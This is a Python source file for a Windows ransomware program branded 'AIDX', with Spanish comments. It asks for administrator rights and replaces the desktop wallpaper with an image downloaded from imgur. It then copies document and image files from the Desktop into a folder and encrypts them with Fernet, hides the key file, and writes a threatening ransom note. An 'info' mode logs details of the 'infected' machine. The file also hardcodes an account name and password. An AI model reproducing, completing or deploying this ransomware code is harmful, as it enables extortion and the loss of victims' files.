import os
import ctypes
import subprocess
import win32com.shell.shell as shell
from cryptography.fernet import Fernet
from PIL import Image
import win32api
import requests
import sys
import shutil
import ctypes

from escan import obtener_informacion_sistema
from utils import cargar_key, encrypt, decrypt, generar_key


USERNAME = "ponce"
PASSWORD = "Ponce1337"
ADMIN_GROUP = "Administrators"
README_FILE = "readme.txt"


def patch_crypto_be_discovery():
    """
    Monkey patches cryptography's backend detection.
    Objective: support pyinstaller freezing.
    """
    from cryptography.hazmat import backends

    try:
        from cryptography.hazmat.backends.commoncrypto.backend import backend as be_cc
    except ImportError:
        be_cc = None

    try:
        from cryptography.hazmat.backends.openssl.backend import backend as be_ossl
    except ImportError:
        be_ossl = None

    backends._available_backends_list = [
        be for be in (be_cc, be_ossl) if be is not None
    ]


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def install_libraries():
    libraries = [
        "cryptography", "psutil", "wmi", "scapy", "pillow", "requests", "nmap", "pywin32", "socket", "winreg"
    ]

    for library in libraries:
        try:
            subprocess.check_output([sys.executable, "-m", "pip", "install", library])
            print(f"Se ha instalado la biblioteca: {library}")
        except subprocess.CalledProcessError:
            print(f"No se pudo instalar la biblioteca: {library}")


def download_image(url, path):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(path, 'wb') as out_file:
            out_file.write(response.content)
    else:
        print(f"Error descargando imagen: {response.status_code}")


def set_wallpaper(path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)


def convert_to_bmp(path):
    image = Image.open(path)
    bmp_path = path.replace('.jpg', '.bmp')
    image.save(bmp_path, "BMP")
    return bmp_path


def encrypt_all(application_path):
    path_to_encrypt = os.path.join(application_path, "files")
    generar_key()
    key = cargar_key()

    # Crear la carpeta "files" en el escritorio si no existe
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    path_to_encrypt = os.path.join(desktop_path, "files")
    if not os.path.exists(path_to_encrypt):
        os.makedirs(path_to_encrypt)

   # Copiar la clave key.key al directorio de la carpeta "files"
    key_file_path = os.path.join(application_path, "key.key")
    destination_path = os.path.join(path_to_encrypt, "key.key")
    shutil.copy2(key_file_path, destination_path)

    # Establecer el atributo oculto del archivo
    FILE_ATTRIBUTE_HIDDEN = 0x02
    kernel32 = ctypes.WinDLL('kernel32')
    kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)

    # Obtener el directorio del escritorio
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    # Carpetas adicionales a incluir
    additional_folders = ["Archivos", "Documentos", "Videos", "Imágenes"]

    for root, directories, files in os.walk(desktop_path):
        # Excluir las carpetas adicionales
        directories[:] = [d for d in directories if d not in additional_folders]

        for file in files:
            # Verificar si el archivo es de Word o PDF
            if file.endswith((".doc", ".docx", ".pdf", ".ppt", ".jpg", ".png")):
                file_path = os.path.join(root, file)
                destination_path = os.path.join(path_to_encrypt, file)
                if not os.path.exists(destination_path):
                    shutil.copy2(file_path, destination_path)
                    encrypt([destination_path], key)

    with open(os.path.join(path_to_encrypt, README_FILE), 'w') as file:
        file.write(' DOCUMENTOS ENCRIPTADOS POR  AIDX\n')
        file.write('.doc", ".docx", ".pdf", ".ppt", ".jpg", ".png \n\n')
        file.write(' DOCUMENTOS ENCRIPTADOS POR  AIDX\n')
        file.write(' .doc", ".docx", ".pdf", ".ppt", ".jpg", ".png \n\n')
        file.write('\n\n')
        file.write('AHORA MI BUEN COMO VA A TRABAJAR SI SUS ARCHIVOS SE ENCUENTRAN CIFRADOS \n\n')
        file.write('\n\n')
        file.write('SI LE DECIMIOS AL JEFE DE JEFES SEÑORES TE VAN A PEGAR LA PLR\n\n')
        file.write('SI LE DECIMIOS AL JEFE DE JEFES SEÑORES TE VAN A PEGAR LA PLR\n\n')
        file.write('SI LE DECIMIOS AL JEFE DE JEFES SEÑORES TE VAN A PEGAR LA PLR\n\n')
        file.write('PLR!_________PLR!!_______PLR!___________PLR!_________PLR!___________>\n\n')
        file.write('\n\n\n\n\n\n\n\n')
        file.write(' TE VAMOS A DAR LA CHANCHE DE DESENCRIPTAR LOS DATOS, AUN NO ESTA DETERMIANDA ')

    print("Archivos encriptados correctamente.")
    print("Archivos TXT escritos con éxito.")


def decrypt_all(application_path):
    path_to_decrypt = os.path.join(application_path, "files")
    key = cargar_key()

    # Descifrar todos los archivos cifrados en la carpeta "files" del escritorio
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    path_to_decrypt = os.path.join(desktop_path, "files")
    for root, directories, files in os.walk(path_to_decrypt):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt([file_path], key)

    # Eliminar el archivo de clave "key.key"
    os.remove(os.path.join(application_path, "key.key"))

    # Eliminar la carpeta "files"
    shutil.rmtree(path_to_decrypt, ignore_errors=True)

    print("Carpeta 'files' eliminada con éxito.")
    print("Desencriptación de archivos correcta.")


def main():
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
        os.chdir(application_path)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))

    patch_crypto_be_discovery()

    if is_admin():
        if len(sys.argv) > 1:
            if sys.argv[1].lower() == "enc":
                # Crear la carpeta "files" en el escritorio si no existe
                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
                path_to_encrypt = os.path.join(desktop_path, "files")
                if not os.path.exists(path_to_encrypt):
                    os.makedirs(path_to_encrypt)

                install_libraries()

                # Descargar y establecer el fondo de pantalla
                img_url = "https://imgur.com/PjyQi8U.jpg"  # URL de la imagen a descargar
                img_path = os.path.join(application_path, "wallpaper.jpg")  # Ruta donde se guardará la imagen
                download_image(img_url, img_path)  # Descargar la imagen
                img_path = convert_to_bmp(img_path)  # Convertir la imagen a .bmp
                set_wallpaper(img_path)  # Establecer la imagen como fondo de pantalla

                encrypt_all(application_path)
                print("Archivos encriptados y archivos TXT escritos con éxito.")
            elif sys.argv[1].lower() == "des":
                decrypt_all(application_path)
            elif sys.argv[1].lower() == "info":
                informacion_sistema = obtener_informacion_sistema()
                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
                path_to_encrypt = os.path.join(desktop_path, "files")
                ruta_archivo_readme = os.path.join(path_to_encrypt, README_FILE)
                ruta_archivo_infectado = os.path.join(path_to_encrypt, "info_equipo_infectado.txt")

                # Actualizar el archivo README.txt
                with open(ruta_archivo_readme, 'a') as archivo_readme:
                    archivo_readme.write("\n\n--- Información del equipo infectado ---\n\n")
                    for clave, valor in informacion_sistema.items():
                        archivo_readme.write(clave + ': ' + str(valor) + '\n')

                # Generar el informe del equipo infectado
                with open(ruta_archivo_infectado, 'w') as archivo_infectado:
                    for clave, valor in informacion_sistema.items():
                        archivo_infectado.write(clave + ': ' + str(valor) + '\n')

                print("Archivo 'readme.txt' actualizado con éxito.")
                print("Archivo 'info_equipo_infectado.txt' creado con éxito en la carpeta 'files'.")

                # Copiar la clave key.key al directorio de la carpeta "files"
                shutil.copy2(os.path.join(application_path, "key.key"), path_to_encrypt)
                print("Por favor, asegúrese de que el colaborador infectado pegue el archivo 'key.key' en la carpeta 'files' para la desencriptación.")

            else:
                print("Argumento inválido. Uso: aidx.py [enc/des/info]")
        else:
            print("Argumento inválido. Uso: aidx.py [enc/des/info]")
    else:
        # Volver a ejecutar el programa con derechos de administrador
        if getattr(sys, 'frozen', False):
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=' '.join(sys.argv))
        else:
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.argv[0], lpParameters=' '.join(sys.argv[1:]))


if __name__ == '__main__':
    main()
